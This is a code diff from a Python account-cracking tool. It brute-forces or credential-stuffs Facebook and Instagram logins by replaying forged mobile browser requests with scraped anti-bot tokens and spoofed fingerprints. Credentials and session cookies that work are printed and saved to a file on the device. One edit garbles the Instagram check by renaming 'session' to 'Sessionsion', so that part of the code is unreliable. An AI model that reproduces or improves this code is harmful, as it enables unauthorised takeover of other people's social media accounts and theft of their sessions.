@@ -1874,80 +1874,65 @@ def d(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            head = {"accept": "*/*", "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9, en-US,en;q=0.8", "x-requested-with": "XMLHttpCanary", "priority": "u=1, i"} 
-            free_fb = Session.get('https://touch.facebook.com').text
-            cookies = {
-            'datr': 'aH3WaNUkO1yuk7Po-ytjAVJc',
-            'sb': 'aX3WaDH7hAO44ftEFYsZy6Of',
-            'm_pixel_ratio': '2.4749999046325684',
-            'wd': '437x973',
-            'fr': '0zyKJJK6dI3lBLjbu..Bo1n1p..AAA.0.0.Bo1n3U.AWfvqPp5N7wsM6LQ4jVHWpwo6QE',}
-            headers = {
-            'Host': 'x.facebook.com',
-            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
-            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
-            'x-response-format': 'JSONStream',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'viewport-width': '360',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-asbd-id': '129477',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua-platform': '"Android"',
-            'accept': '*/*',
-            'origin': 'https://x.facebook.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-            params = {
-            'api_key': '822446634883149',
-            'auth_token': '376df36ddda6d8ca677cca104504e039',
-            'skip_api_login': '1',
-            'signed_next': '1',
-            'next': 'https://x.facebook.com/v3.3/dialog/oauth?client_id=822446634883149',
-            'refsrc': 'deprecated',
-            'app_id': '822446634883149',
-            'cancel': 'https://ncs.io/facebook/login-callback?error=access_denied',
-            'lwv': '100',}
+            requ = Session.get('https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+            kueh = (f'{";".join([ "%s=%s"%(keys, value) for keys, value in Session.cookies.get_dict().items() ])}')
             data = {
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
-            'had_password_prefilled': 'true',
-            'is_smart_lock': 'false',
-            'bi_xrwh': '92004344361786634',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'fb_dtsg': 'NAfup2Me3JHXJFN2yxBY35qKn-1LtNpMqJhQzaJ3AqYbs8PMFOvFhGw:0:0',
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            '_dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE',
-            'csr': '',
-            'hsdp': '',
-            'hblp': '',
-            'sjsp': '',
-            'req': '1',
-            'fmt': '1',
-            'a': 'AYrzCMozrxxEkLpLMe4Y2HjtqtsmVGwYzrN5JRYYClldhdPtYgFp1Jf_aTSnrZs9GEMJRGEqpBnp7Yr7bbjZFjK5_l3XCV2rjhwTOtu5o4lWwg',
-            '_user': '0',}
-            url = "https://x.facebook.com/login/device-based/login/async/"
-            Session.headers.update(headers)
-            for k, v in cookies.items():
-                Session.cookies.set(k, v, domain=".facebook.com")
-            resp = Session.post(url, params=params, data=data, allow_redirects=True, timeout=30)
+				'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
+				'li':re.search('name="li" value="(.*?)"',str(requ)).group(1),
+				'try_number':'0',
+				'unrecognized_tries':'0',
+				'email':f'{uid}',
+				'prefill_contact_point':f'{uid}',
+				'prefill_source':'browser_dropdown',
+				'prefill_type':'password',
+				'first_prefill_source':'browser_dropdown',
+				'first_prefill_type':'contact_point',
+				'had_cp_prefilled':'true',
+				'had_password_prefilled':'true',
+				'is_smart_lock':'false',
+				'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requ)).group(1),
+				'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+				'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
+				'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requ)).group(1),
+				'jazoest':re.search('name="jazoest" value="(.*?)"',str(requ)).group(1),
+				'lsd':re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
+				'__dyn':'',
+				'__csr':'',
+				'__req':rc(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
+				'__fmt':'1',
+				'__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
+				'__user':'0'
+			}
+            head = {
+				'Host': 'x.prod.facebook.com',
+				'content-length': f'{len(str(data))}',
+				'sec-ch-ua': '"Android WebView";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+				'sec-ch-ua-mobile': '?0',
+				'user-agent': ua,
+				'x-response-format': 'JSONStream',
+				'content-type': 'application/x-www-form-urlencoded',
+				'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
+				'sec-ch-ua-platform-version': '""',
+				'x-requested-with': 'XMLHttpRequest',
+				'x-asbd-id': '129477',
+				'sec-ch-ua-full-version-list': '"Android WebView";v="125.0.6422.53", "Chromium";v="125.0.6422.53", "Not.A/Brand";v="24.0.0.0"',
+				'sec-ch-ua-model': '""',
+				'sec-ch-prefers-color-scheme': 'dark',
+				'sec-ch-ua-platform': '"Linux"',
+				'accept': '*/*',
+				'origin': 'https://x.prod.facebook.com',
+				'sec-fetch-site': 'same-origin',
+				'sec-fetch-mode': 'cors',
+				'sec-fetch-dest': 'empty',
+				'referer': 'https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+				'accept-encoding': 'gzip, deflate, br, zstd',
+				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+				'priority': 'u=1, i'
+			}
+            resp = Session.post(
+				'https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
+				cookies = {'cookie': kueh}, data = data, headers = head, allow_redirects = False
+			)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1979,7 +1964,7 @@ def d(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        #print({error})
+        print({error})
         pass
 
 def cracker(uid, pwx, tl):
@@ -2112,10 +2097,10 @@ def crack(uid, pww, total_idz):
     sys.stdout.flush()
     try:
         for pw in pww:
-            session = requests.Session()
+            Sessionsion = requests.Session()
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            response = session.get('https://www.instagram.com/accounts/login/')
+            response = Sessionsion.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
             cookies ={
                 'csrftoken': csrftoken,
@@ -2160,7 +2145,7 @@ def crack(uid, pww, total_idz):
                 'x-requested-with': 'XMLHttpRequest',}
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
-            session_cookies = response.cookies.get_dict()
+            Sessionsion_cookies = response.cookies.get_dict()
             if response.status_code == 200:
                 json_response = response.json()
                 if json_response.get('status') == 'ok':
@@ -2176,7 +2161,7 @@ def crack(uid, pww, total_idz):
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
                         oks.append(uid)
                         return True
-                   elif 'sessionid' in session_cookies:
+                   elif 'Sessionsionid' in Sessionsion_cookies:
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
